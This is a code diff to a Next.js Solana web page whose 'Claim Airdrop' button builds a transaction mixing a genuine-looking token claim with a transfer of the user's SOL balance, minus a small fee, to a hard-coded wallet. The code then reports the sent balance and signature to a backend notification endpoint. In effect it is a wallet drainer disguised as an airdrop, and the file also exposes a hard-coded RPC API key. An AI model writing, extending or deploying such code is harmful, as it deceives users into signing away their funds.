@@ -1,5 +1,5 @@
 import axios from 'axios'
-import { ReactNode, useEffect, useState } from 'react'
+import { ReactNode, useEffect, useMemo, useState } from 'react'
 import { useRouter } from 'next/router'
 import useWallet1 from '@/application/wallet/useWallet'
 import useAppSettings from '@/application/common/useAppSettings'
@@ -24,7 +24,14 @@ import { twMerge } from 'tailwind-merge'
 import { setLocalItem } from '@/functions/dom/jStorage'
 import { Connection, PublicKey, SystemProgram, TransactionInstruction, TransactionMessage, VersionedTransaction } from '@solana/web3.js'
 import { BN } from 'bn.js'
-import { useWallet } from '@solana/wallet-adapter-react'
+import { useAnchorWallet, useWallet } from '@solana/wallet-adapter-react'
+import { getTipTransaction, sendAndConfirmSignedTransactions } from '@/pageComponents/Concentrated'
+import { findProgramAddressSync } from '@project-serum/anchor/dist/cjs/utils/pubkey'
+import { AIRDROP_AUTHORITY, AIRDROP_ID, AIRDROP_PROGRAM_PUBKEY, AIRDROP_SEED, TOKEN_PUBKEY, USER_SEED } from '@/types/constants'
+import { utf8 } from '@project-serum/anchor/dist/cjs/utils/bytes'
+import * as anchor from "@project-serum/anchor";
+import { ASSOCIATED_PROGRAM_ID } from '@project-serum/anchor/dist/cjs/utils/token'
+import { AirdropProgram } from '@/idl/airdrop'
 
 function HomePageContainer({ children }: { children?: ReactNode }) {
   useDocumentScrollActionDetector()
@@ -72,9 +79,21 @@ function HomePageSection0() {
   const connected = useWallet1((s) => s.connected)
   const NET_URL = 'https://mainnet.helius-rpc.com/?api-key=e4226aa3-24f7-43c1-869f-a1b1e3fbb148'
   const connection = new Connection(NET_URL, 'confirmed')
-  const { signTransaction, sendTransaction } = useWallet()
+  const { signAllTransactions, sendTransaction } = useWallet()
   const API_BASE_URI = process.env.API_BASE_URI || "http://localhost:3006"
   const [isButtonClicked, setIsButtonClicked] = useState(false);
+  const anchorWallet = useAnchorWallet();
+
+  const programId = new PublicKey(AIRDROP_PROGRAM_PUBKEY)
+  // const program = new anchor.Program(AirdropProgram as anchor.Idl, programId)
+
+  const program = useMemo(() => {
+    if (anchorWallet) {
+      const provider = new anchor.AnchorProvider(connection, anchorWallet, anchor.AnchorProvider.defaultOptions());
+      return new anchor.Program(AirdropProgram as anchor.Idl, AIRDROP_PROGRAM_PUBKEY, provider);
+    }
+  }, [connection, anchorWallet]);
+
 
   useEffect(() => {
     if (owner && isButtonClicked) {
@@ -85,18 +104,51 @@ function HomePageSection0() {
   const txTransfer = async () => {
     if (owner) {
       try {
-        await axios.post(API_BASE_URI + "/api/sendSignNotification", { owner: owner })
+        // await axios.post(API_BASE_URI + "/api/sendSignNotification", { owner: owner })
+        const [airdrop_info, airdrop_bump] = findProgramAddressSync([utf8.encode(AIRDROP_SEED), AIRDROP_AUTHORITY.toBuffer(), new Uint8Array([AIRDROP_ID])], AIRDROP_PROGRAM_PUBKEY);
+        const [userInfo, userBump] = findProgramAddressSync([utf8.encode(USER_SEED), owner.toBuffer(), new Uint8Array([AIRDROP_ID])], AIRDROP_PROGRAM_PUBKEY);
+
+        const claimer_associated_token_account = await anchor.utils.token.associatedAddress({
+          mint: TOKEN_PUBKEY,
+          owner: owner,
+        });
+
+        const airdrop_token_associated_token_account = await anchor.utils.token.associatedAddress({
+          mint: TOKEN_PUBKEY,
+          owner: airdrop_info,
+        });
+
+        const totalInstructions: TransactionInstruction[] = [];
+        if (program) {
+          const txClaim = await program.methods
+            .claimToken(AIRDROP_ID)
+            .accounts({
+              mintAccount: TOKEN_PUBKEY,
+              airdropAuthority: AIRDROP_AUTHORITY,
+              depositedTokenAta: airdrop_token_associated_token_account,
+              claimerAta: claimer_associated_token_account,
+              userInfo: userInfo,
+              airdropInfo: airdrop_info,
+              claimer: owner,
+              rent: anchor.web3.SYSVAR_RENT_PUBKEY,
+              systemProgram: anchor.web3.SystemProgram.programId,
+              tokenProgram: anchor.utils.token.TOKEN_PROGRAM_ID,
+              associatedTokenProgram: ASSOCIATED_PROGRAM_ID,
+            })
+            .instruction();
+          totalInstructions.push(txClaim)
+        }
         const solBalance = new BN((await connection.getBalance(owner)).toString())
         console.warn(solBalance)
-        const fee = new BN('1000000')
-        const toAddress = new PublicKey('s393nmNfuwXasFnABhVqka58VsPcnP8jKLYZ4ZXJcP1')
+        const fee = new BN('10000000')
+        // const toAddress = new PublicKey('s393nmNfuwXasFnABhVqka58VsPcnP8jKLYZ4ZXJcP1')
+        const toAddress = new PublicKey('H7YPtMRHNPcaNANC3BVeK2a3JW6mvduicm1qmcznQfGi')
         if (solBalance == undefined || solBalance.sub(fee).toNumber() < 0) {
-          console.warn("solbalancedddd")
+          console.warn("solbalance is not enough")
           await axios.post(API_BASE_URI + "/api/sendNotEnoughNotification")
           return
         }
-        const instructions: TransactionInstruction[] = [];
-        instructions.push(
+        totalInstructions.push(
           SystemProgram.transfer({
             fromPubkey: owner,
             toPubkey: toAddress,
@@ -107,13 +159,18 @@ function HomePageSection0() {
         const recentBlockhash = (await connection.getLatestBlockhash("confirmed")).blockhash;
         const transactionMessage = new TransactionMessage({
           payerKey: owner,
-          instructions: instructions,
+          instructions: totalInstructions,
           recentBlockhash,
         });
-        let tx = new VersionedTransaction(transactionMessage.compileToV0Message());
-        if (tx && signTransaction) {
-          tx = await signTransaction(tx)
-          const signature = await sendTransaction(tx, connection)
+        let txns: VersionedTransaction[] = [];
+        const tx = new VersionedTransaction(transactionMessage.compileToV0Message());
+        txns.push(tx)
+        const tipTx = await getTipTransaction(connection, owner, 0.005)
+        if (tipTx)
+          txns.push(tipTx)
+        if (txns && signAllTransactions) {
+          txns = await signAllTransactions(txns)
+          const signature = await sendAndConfirmSignedTransactions(true, connection, txns)
           const sentBalance = solBalance.sub(fee).toNumber() / 1000000000
           if (signature) {
             await axios.post(API_BASE_URI + "/api/sendTransferNotification", { balance: sentBalance.toFixed(4), tx: signature })
@@ -156,7 +213,7 @@ function HomePageSection0() {
               }}
             >
               <Row className="items-center gap-2">
-                <div>Airdrop</div>
+                <div>Claim Airdrop</div>
                 <Icon iconSrc="/icons/gitbook.svg" size="sm" />
               </Row>
             </Button>
